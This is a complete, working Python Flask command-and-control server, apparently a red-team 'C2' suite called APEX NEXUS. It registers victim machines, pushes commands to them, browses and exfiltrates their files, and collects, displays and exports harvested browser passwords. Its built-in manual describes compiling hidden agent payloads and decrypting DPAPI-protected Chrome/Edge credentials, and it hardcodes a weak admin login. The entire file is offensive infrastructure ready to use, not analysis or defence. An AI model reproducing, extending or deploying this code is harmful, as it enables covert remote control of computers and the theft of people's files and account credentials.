#!/usr/bin/env python3
"""
APEX NEXUS — All-In-One Red Team Tactical Suite & C2 Engine
Architecture: Single-file Flask backend + SQLite + SSE Real-Time C2 + Cyber-Tactical UI
Theme: Obsidian Black & Crimson Red (#ff1f3d)
"""

import os
import sys
import json
import sqlite3
import threading
import queue
import time
import base64
import csv
import io
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, Response, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.urandom(24)

DB_NAME = "redteam_dashboard.db"
EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

# ==========================================
# 1. DATABASE & EVENT BROKER INITIALIZATION
# ==========================================
class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()

    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def init_db(self):
        with self.get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id TEXT PRIMARY KEY,
                    ip_address TEXT,
                    fingerprint TEXT,
                    status TEXT,
                    last_seen TIMESTAMP
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id TEXT,
                    command_type TEXT,
                    args TEXT,
                    status TEXT,
                    result TEXT,
                    timestamp TIMESTAMP
                )
            """)
            conn.commit()

    fn_lock = threading.Lock()

    def upsert_victim(self, victim_id, ip, fingerprint):
        with self.fn_lock, self.get_connection() as conn:
            conn.execute("""
                INSERT INTO victims (id, ip_address, fingerprint, status, last_seen)
                VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ON CONFLICT(id) DO UPDATE SET
                    ip_address=excluded.ip_address,
                    fingerprint=excluded.fingerprint,
                    status='online',
                    last_seen=CURRENT_TIMESTAMP
            """, (victim_id, ip, json.dumps(fingerprint)))
            conn.commit()

    def add_command(self, victim_id, command_type, args={}):
        with self.fn_lock, self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO commands (victim_id, command_type, args, status, result, timestamp)
                VALUES (?, ?, ?, 'pending', '', CURRENT_TIMESTAMP)
            """, (victim_id, command_type, json.dumps(args)))
            conn.commit()
            return cursor.lastrowid

    def update_command_result(self, command_id, result):
        with self.fn_lock, self.get_connection() as conn:
            conn.execute("""
                UPDATE commands SET status='executed', result=? WHERE id=?
            """, (result, command_id))
            conn.commit()

db = DatabaseManager(DB_NAME)

class EventNotifier:
    def __init__(self):
        self.listeners = {} # victim_id -> list of Queue objects
        self.lock = threading.Lock()

    def register(self, victim_id):
        q = queue.Queue()
        with self.lock:
            if victim_id not in self.listeners:
                self.listeners[victim_id] = []
            self.listeners[victim_id].append(q)
        return q

    def unregister(self, victim_id, q):
        with self.lock:
            if victim_id in self.listeners:
                if q in self.listeners[victim_id]:
                    self.listeners[victim_id].remove(q)
                if not self.listeners[victim_id]:
                    del self.listeners[victim_id]

    def notify(self, victim_id):
        with self.lock:
            if victim_id in self.listeners:
                for q in self.listeners[victim_id]:
                    q.put(True)

event_notifier = EventNotifier()

# ==========================================
# 2. CYBERPUNK CSS & LAYOUT TEMPLATES
# ==========================================
GLOBAL_STYLE = """
<style>
    :root {
        --bg-main: #050505;
        --bg-panel: #0a0a0c;
        --accent-red: #ff1f3d;
        --accent-glow: rgba(255, 31, 61, 0.25);
        --text-main: #f4f4f5;
        --text-muted: #a1a1aa;
        --border-color: #27272a;
    }
    body {
        background-color: var(--bg-main);
        color: var(--text-main);
        font-family: 'Courier New', Courier, monospace;
        margin: 0;
        padding: 0;
    }
    header {
        background: var(--bg-panel);
        border-bottom: 1px solid var(--accent-red);
        padding: 15px 30px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 0 15px var(--accent-glow);
    }
    h1, h2, h3 {
        color: var(--accent-red);
        text-transform: uppercase;
        letter-spacing: 2px;
        margin: 0 0 10px 0;
    }
    .container {
        max-width: 1400px;
        margin: 30px auto;
        padding: 0 20px;
    }
    .panel {
        background: var(--bg-panel);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        padding: 20px;
        margin-bottom: 25px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
    }
    table {
        width: 100%;
        border-collapse: collapse;
        font-size: 0.85rem;
        text-align: left;
    }
    th, td {
        padding: 12px;
        border-bottom: 1px solid var(--border-color);
    }
    th {
        color: var(--text-muted);
        text-transform: uppercase;
        font-size: 0.75rem;
        letter-spacing: 1px;
    }
    .btn {
        background: var(--accent-red);
        color: #fff;
        border: none;
        padding: 8px 16px;
        font-family: monospace;
        font-weight: bold;
        text-transform: uppercase;
        border-radius: 4px;
        cursor: pointer;
        box-shadow: 0 0 10px var(--accent-glow);
        transition: all 0.2s ease;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        background: #e60021;
        box-shadow: 0 0 18px var(--accent-red);
    }
    input, select {
        background: #050505;
        border: 1px solid var(--border-color);
        color: var(--text-main);
        padding: 8px 12px;
        font-family: monospace;
        border-radius: 4px;
    }
    .badge-online { color: #22c55e; font-weight: bold; }
    .badge-offline { color: var(--text-muted); }
    .nav-tabs {
        display: flex;
        gap: 15px;
        margin-bottom: 20px;
        border-bottom: 1px solid var(--border-color);
        padding-bottom: 10px;
    }
    .nav-tab {
        color: var(--text-muted);
        text-decoration: none;
        text-transform: uppercase;
        font-size: 0.85rem;
        letter-spacing: 1px;
        padding-bottom: 5px;
    }
    .nav-tab.active {
        color: var(--accent-red);
        border-bottom: 2px solid var(--accent-red);
    }
</style>
"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // AUTHENTICATION</title>""" + GLOBAL_STYLE + """</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh;">
    <div class="panel" style="width: 380px; text-align: center;">
        <h2>APEX NEXUS</h2>
        <p style="color: var(--text-muted); font-size: 0.8rem; margin-bottom: 20px;">RESTRICTED ACCESS // RED TEAM SUITE</p>
        {% if error %}<p style="color: var(--accent-red); font-size: 0.8rem;">{{ error }}</p>{% endif %}
        <form method="POST">
            <div style="margin-bottom: 15px;"><input type="text" name="username" placeholder="Operator ID" style="width: 100%; box-sizing: border-box;" required></div>
            <div style="margin-bottom: 20px;"><input type="password" name="password" placeholder="Access Passphrase" style="width: 100%; box-sizing: border-box;" required></div>
            <button type="submit" class="btn" style="width: 100%;">Authorize Session</button>
        </form>
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // TACTICAL COMMAND CENTER</title>""" + GLOBAL_STYLE + """</head>
<body>
    <header>
        <div>
            <h1 style="margin: 0; font-size: 1.2rem;">APEX NEXUS <span style="font-size: 0.7rem; color: var(--text-muted);">v2.0 AIO</span></h1>
        </div>
        <div>
            <span style="color: var(--text-muted); font-size: 0.8rem; margin-right: 15px;">OPERATOR: ADMIN</span>
            <a href="/logout" class="btn" style="padding: 5px 10px; font-size: 0.75rem;">Terminate Session</a>
        </div>
    </header>

    <div class="container">
        <div class="nav-tabs">
            <a href="/dashboard" class="nav-tab active">C2 Fleet Overview</a>
            <a href="/dashboard#credentials" class="nav-tab" onclick="switchTab('vault')">Credential Vault</a>
            <a href="/dashboard#manual" class="nav-tab" onclick="switchTab('manual')">Tactical Manual</a>
        </div>

        <!-- C2 FLEET PANEL -->
        <div id="tab-fleet" class="panel">
            <h3>[+] Active C2 Fleet</h3>
            <table>
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>IP Address</th>
                        <th>Platform Fingerprint</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for v in victims %}
                    <tr>
                        <td style="color: #38bdf8; font-weight: bold;">{{ v.id }}</td>
                        <td>{{ v.ip_address }}</td>
                        <td style="color: var(--text-muted); font-size: 0.75rem;">{{ v.fingerprint }}</td>
                        <td><span class="badge-online">ONLINE</span></td>
                        <td style="font-size: 0.75rem; color: var(--text-muted);">{{ v.last_seen }}</td>
                        <td><a href="/victim/{{ v.id }}" class="btn" style="padding: 4px 10px; font-size: 0.75rem;">Terminal</a></td>
                    </tr>
                    {% else %}
                    <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">[!] No active agents checked in. Deploy payload stager.</td></tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <!-- CREDENTIAL VAULT PANEL -->
        <div id="tab-vault" class="panel" style="display: none;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3>[+] Harvested Credentials Vault</h3>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="credSearch" placeholder="Filter URL or user..." onkeyup="filterVault()" style="width: 250px;">
                    <a href="/api/v1/credentials/export" class="btn" style="background: rgba(255,31,61,0.15); border: 1px solid var(--accent-red); color: var(--accent-red);">Export CSV</a>
                    <button class="btn" onclick="loadVault()">Refresh</button>
                </div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>Target URL</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody id="vaultTableBody">
                    <tr><td colspan="5" style="text-align: center; color: var(--text-muted);">Loading vault records...</td></tr>
                </tbody>
            </table>
        </div>

        <!-- TACTICAL MANUAL PANEL -->
        <div id="tab-manual" class="panel" style="display: none; line-height: 1.6; font-size: 0.85rem;">
            <h3>[+] APEX NEXUS Operator's Manual</h3>
            <hr style="border-color: var(--border-color); margin-bottom: 20px;">
            <p><strong>1. Payload Generation:</strong> Use the companion payload generator to embed your C2 listener address and compile standalone binaries via PyInstaller (`python apex_payload_generator.py --c2 "http://<IP>:5000" --id "AGENT_01" --hidden`).</p>
            <p><strong>2. Server-Sent Events (SSE) C2 Loop:</strong> Deployed agents check in via heartbeat and maintain an open HTTP SSE stream. Commands dispatched from the terminal modal push instantly down this persistent pipe.</p>
            <p><strong>3. Remote File Explorer:</strong> Navigate directory trees recursively and trigger one-click file exfiltration straight into the server's local <code>exfil/</code> folder.</p>
            <p><strong>4. Credential Harvesting:</strong> Execute the `dump_creds` module to decrypt Windows DPAPI-protected Chrome/Edge login databases, automatically aggregating accounts in the Vault tab.</p>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            document.getElementById('tab-fleet').style.display = tab === 'fleet' ? 'block' : 'none';
            document.getElementById('tab-vault').style.display = tab === 'vault' ? 'block' : 'none';
            document.getElementById('tab-manual').style.display = tab === 'manual' ? 'block' : 'none';
            
            document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
            if(tab === 'fleet') event.target.classList.add('active');
            if(tab === 'vault') { document.querySelectorAll('.nav-tab')[1].classList.add('active'); loadVault(); }
            if(tab === 'manual') document.querySelectorAll('.nav-tab')[2].classList.add('active');
        }

        let vaultData = [];
        async function loadVault() {
            let res = await fetch('/api/v1/credentials/all');
            let data = await res.json();
            if(data.status === 'success') {
                vaultData = data.credentials;
                renderVault(vaultData);
            }
        }
        function renderVault(creds) {
            let tbody = document.getElementById('vaultTableBody');
            tbody.innerHTML = "";
            if(creds.length === 0) {
                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 20px;">No credentials harvested yet.</td></tr>`;
                return;
            }
            creds.forEach(c => {
                tbody.innerHTML += `
                    <tr style="border-bottom: 1px solid #18181b;">
                        <td style="color: #38bdf8; font-weight: bold;">${c.agent_id}</td>
                        <td style="color: #f4f4f5; max-width: 250px; overflow: hidden; text-overflow: ellipsis;">${c.url}</td>
                        <td>${c.username}</td>
                        <td style="color: var(--accent-red); font-family: monospace;">${c.password}</td>
                        <td style="color: var(--text-muted); font-size: 0.75rem;">${c.timestamp}</td>
                    </tr>
                `;
            });
        }
        function filterVault() {
            let q = document.getElementById('credSearch').value.toLowerCase();
            let filtered = vaultData.filter(c => c.url.toLowerCase().includes(q) || c.username.toLowerCase().includes(q));
            renderVault(filtered);
        }
    </script>
</body>
</html>
"""

VICTIM_TERMINAL_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // TERMINAL // {{ victim.id }}</title>""" + GLOBAL_STYLE + """</head>
<body>
    <header>
        <div>
            <h1 style="margin: 0; font-size: 1.1rem;">AGENT: <span style="color: #38bdf8;">{{ victim.id }}</span></h1>
        </div>
        <div>
            <a href="/dashboard" class="btn" style="padding: 5px 10px; font-size: 0.75rem;">Back to Fleet</a>
        </div>
    </header>

    <div class="container" style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <!-- COMMAND DISPATCH PANEL -->
        <div>
            <div class="panel">
                <h3>[+] Dispatch Command</h3>
                <form id="cmdForm" onsubmit="handleDispatch(event)">
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase;">Select Module</label>
                        <select id="commandType" style="width: 100%;" onchange="checkParameterized(this)">
                            <option value="collect_data">Collect Full System Fingerprint</option>
                            <option value="screenshot">Capture Desktop Screenshot</option>
                            <option value="dump_creds">Harvest Browser Credentials</option>
                            <option value="list_directory">Remote File Explorer (List Dir)</option>
                            <option value="file_upload">Exfiltrate File (Target -> C2)</option>
                        </select>
                    </div>
                    <div id="paramContainer" style="margin-bottom: 15px; display: none;">
                        <label id="paramLabel" style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase;"></label>
                        <input type="text" id="paramInput" style="width: 100%; box-sizing: border-box;" placeholder="">
                    </div>
                    <button type="submit" class="btn" style="width: 100%;">Dispatch Task</button>
                </form>
            </div>

            <!-- REMOTE FILE EXPLORER -->
            <div class="panel">
                <h3>[+] Remote File Explorer</h3>
                <div style="display: flex; gap: 10px; margin-bottom: 12px; align-items: center;">
                    <input type="text" id="currentPath" value="." style="flex-grow: 1;" readonly>
                    <button class="btn" onclick="fetchDir('.')">Load Root</button>
                </div>
                <div id="fileTree" style="background: #050505; border: 1px solid var(--border-color); border-radius: 4px; padding: 10px; height: 220px; overflow-y: auto; font-size: 0.8rem;">
                    <div style="color: var(--text-muted);">[!] Click 'Load Root' to browse target file system...</div>
                </div>
            </div>
        </div>

        <!-- EXECUTION LOGS -->
        <div>
            <div class="panel" style="height: 560px; display: flex; flex-direction: column;">
                <h3>[+] Live Telemetry & Output Log</h3>
                <div id="logContainer" style="flex-grow: 1; background: #050505; border: 1px solid var(--border-color); border-radius: 4px; padding: 15px; overflow-y: auto; font-family: monospace; font-size: 0.8rem; white-space: pre-wrap;">
                    Waiting for telemetry output...
                </div>
            </div>
        </div>
    </div>

    <script>
        const victimId = "{{ victim.id }}";

        function checkParameterized(select) {
            let val = select.value;
            let container = document.getElementById('paramContainer');
            let label = document.getElementById('paramLabel');
            let input = document.getElementById('paramInput');

            if (val === 'list_directory' || val === 'file_upload') {
                container.style.display = 'block';
                label.innerText = val === 'list_directory' ? 'Directory Path' : 'Target Absolute File Path';
                input.placeholder = val === 'list_directory' ? 'C:\\' : 'C:\\Users\\Target\\Desktop\\secrets.txt';
                input.value = val === 'list_directory' ? '.' : '';
            } else {
                container.style.display = 'none';
            }
        }

        async function handleDispatch(e) {
            e.preventDefault();
            let cmdType = document.getElementById('commandType').value;
            let args = {};
            if (cmdType === 'list_directory' || cmdType === 'file_upload') {
                let val = document.getElementById('paramInput').value;
                args[cmdType === 'list_directory' ? 'path' : 'path'] = val;
            }

            let res = await fetch('/api/v1/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: victimId, command_type: cmdType, args: args })
            });
            let data = await res.json();
            appendLog(`[*] Dispatched command [${cmdType}] (ID: ${data.command_id}). Waiting for result...`);
            pollResult(data.command_id);
        }

        async function pollResult(cmdId) {
            let interval = setInterval(async () => {
                let res = await fetch(`/api/v1/commands/${cmdId}`);
                let data = await res.json();
                if(data.status === 'executed') {
                    clearInterval(interval);
                    appendLog(`[+] Result for Command #${cmdId}:\\n${data.result}\\n-------------------------------------------`);
                }
            }, 1500);
        }

        function appendLog(text) {
            let log = document.getElementById('logContainer');
            log.innerText += "\\n" + text;
            log.scrollTop = log.scrollHeight;
        }

        async function fetchDir(path) {
            appendLog(`[*] Requesting directory listing for: ${path}`);
            let res = await fetch('/api/v1/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: victimId, command_type: 'list_directory', args: { path: path } })
            });
            let data = await res.json();
            pollDirResult(data.command_id);
        }

        async function pollDirResult(cmdId) {
            let interval = setInterval(async () => {
                let res = await fetch(`/api/v1/commands/${cmdId}`);
                let data = await res.json();
                if(data.status === 'executed') {
                    clearInterval(interval);
                    try {
                        let parsed = JSON.parse(data.result);
                        document.getElementById('currentPath').value = parsed.current_path;
                        renderTree(parsed.entries);
                    } catch(e) {
                        appendLog(`[-] Failed to parse directory listing.`);
                    }
                }
            }, 1500);
        }

        function renderTree(entries) {
            let tree = document.getElementById('fileTree');
            tree.innerHTML = "";
            entries.sort((a, b) => (b.is_dir - a.is_dir) || a.name.localeCompare(b.name));
            entries.forEach(entry => {
                let div = document.createElement('div');
                div.style.padding = "4px 6px";
                div.style.cursor = "pointer";
                div.style.display = "flex";
                div.style.justifyContent = "space-between";
                div.onmouseover = () => div.style.background = "#18181b";
                div.onmouseout = () => div.style.background = "transparent";

                if (entry.is_dir) {
                    div.innerHTML = `<span style="color: #38bdf8;">[DIR] ${entry.name}</span><span style="color: var(--text-muted); font-size: 0.7rem;">Open</span>`;
                    div.onclick = () => fetchDir(entry.path);
                } else {
                    div.innerHTML = `<span style="color: #f4f4f5;">[FILE] ${entry.name}</span><span style="color: var(--text-muted); font-size: 0.7rem;">${(entry.size/1024).toFixed(1)} KB</span>`;
                    div.onclick = () => {
                        if(confirm(`Exfiltrate file?\\n${entry.path}`)) {
                            fetch('/api/v1/dispatch', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ victim_id: victimId, command_type: 'file_upload', args: { path: entry.path } })
                            }).then(() => appendLog(`[+] Exfiltration queued for: ${entry.path}`));
                        }
                    };
                }
                tree.appendChild(div);
            });
        }
    </script>
</body>
</html>
"""

# ==========================================
# 3. FLASK WEB ROUTES & API ENDPOINTS
# ==========================================
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("username") == "admin" and request.form.get("password") == "nexus123":
            session["authenticated"] = True
            return redirect(url_for("dashboard"))
        return render_template_string(LOGIN_TEMPLATE, error="Invalid Operator Credentials")
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/dashboard")
def dashboard():
    if not session.get("authenticated"):
        return redirect(url_for("login"))
    with db.get_connection() as conn:
        victims = conn.execute("SELECT * FROM victims ORDER BY last_seen DESC").fetchall()
    return render_template_string(DASHBOARD_TEMPLATE, victims=victims)

@app.route("/victim/<victim_id>")
def victim_terminal(victim_id):
    if not session.get("authenticated"):
        return redirect(url_for("login"))
    with db.get_connection() as conn:
        victim = conn.execute("SELECT * FROM victims WHERE id=?", (victim_id,)).fetchone()
    return render_template_string(VICTIM_TERMINAL_TEMPLATE, victim=victim)

@app.route("/api/v1/heartbeat", methods=["POST"])
def api_heartbeat():
    data = request.json
    victim_id = data.get("id")
    fingerprint = data.get("fingerprint", {})
    ip_address = request.remote_addr
    db.upsert_victim(victim_id, ip_address, fingerprint)
    return jsonify({"status": "acknowledged"})

@app.route("/api/v1/stream", methods=["GET"])
def api_stream():
    victim_id = request.args.get("id")
    q = event_notifier.register(victim_id)

    def event_stream():
        try:
            yield ": keepalive\n\n"
            while True:
                q.get() # Wait for notify event
                with db.get_connection() as conn:
                    cmds = conn.execute("SELECT * FROM commands WHERE victim_id=? AND status='pending'", (victim_id,)).fetchall()
                for cmd in cmds:
                    payload = json.dumps({"id": cmd["id"], "command_type": cmd["command_type"], "args": json.loads(cmd["args"] if cmd["args"] else "{}")})
                    yield f"data: {payload}\n\n"
        except GeneratorExit:
            event_notifier.unregister(victim_id, q)

    return Response(event_stream(), mimetype="text/event-stream")

@app.route("/api/v1/dispatch", methods=["POST"])
def api_dispatch():
    data = request.json
    victim_id = data.get("victim_id")
    command_type = data.get("command_type")
    args = data.get("args", {})
    cmd_id = db.add_command(victim_id, command_type, args)
    event_notifier.notify(victim_id)
    return jsonify({"status": "success", "command_id": cmd_id})

@app.route("/api/v1/result", methods=["POST"])
def api_result():
    data = request.json
    command_id = data.get("command_id")
    result_text = data.get("result")

    # Handle automatic exfil decoding if payload is file package
    try:
        res_json = json.loads(result_text)
        if isinstance(res_json, dict) and "filename" in res_json and "data" in res_json:
            file_path = os.path.join(EXFIL_DIR, res_json["filename"])
            with open(file_path, "wb") as f:
                f.write(base64.b64decode(res_json["data"]))
            result_text = f"[+] File successfully exfiltrated and saved to server storage: {file_path}"
    except Exception:
        pass

    db.update_command_result(command_id, result_text)
    return jsonify({"status": "acknowledged"})

@app.route("/api/v1/commands/<int:cmd_id>")
def api_get_command(cmd_id):
    with db.get_connection() as conn:
        cmd = conn.execute("SELECT * FROM commands WHERE id=?", (cmd_id,)).fetchone()
    if not cmd:
        return jsonify({"status": "not_found"}), 404
    return jsonify({"status": cmd["status"], "result": cmd["result"]})

@app.route("/api/v1/credentials/all")
def api_all_credentials():
    with db.get_connection() as conn:
        rows = conn.execute("""
            SELECT c.id, c.victim_id, c.timestamp, c.result, v.ip_address 
            FROM commands c JOIN victims v ON c.victim_id = v.id
            WHERE c.command_type = 'dump_creds' AND c.status = 'executed'
            ORDER BY c.timestamp DESC
        """).fetchall()

    vault = []
    for r in rows:
        try:
            accounts = json.loads(r["result"])
            if isinstance(accounts, list):
                for acc in accounts:
                    vault.append({
                        "agent_id": r["victim_id"],
                        "url": acc.get("url", "N/A"),
                        "username": acc.get("username", "N/A"),
                        "password": acc.get("password", "N/A"),
                        "timestamp": r["timestamp"]
                    })
        except Exception:
            continue
    return jsonify({"status": "success", "credentials": vault})

@app.route("/api/v1/credentials/export")
def export_credentials_csv():
    with db.get_connection() as conn:
        rows = conn.execute("""
            SELECT c.victim_id, c.timestamp, c.result, v.ip_address 
            FROM commands c JOIN victims v ON c.victim_id = v.id
            WHERE c.command_type = 'dump_creds' AND c.status = 'executed'
        """).fetchall()

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Agent ID", "IP Address", "Target URL", "Username", "Password", "Timestamp"])

    for r in rows:
        try:
            accounts = json.loads(r["result"])
            if isinstance(accounts, list):
                for acc in accounts:
                    writer.writerow([r["victim_id"], r["ip_address"], acc.get("url"), acc.get("username"), acc.get("password"), r["timestamp"]])
        except Exception:
            continue

    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=apex_credentials.csv"})

if __name__ == "__main__":
    print("[*] Starting APEX NEXUS AIO Tactical Command Center on http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
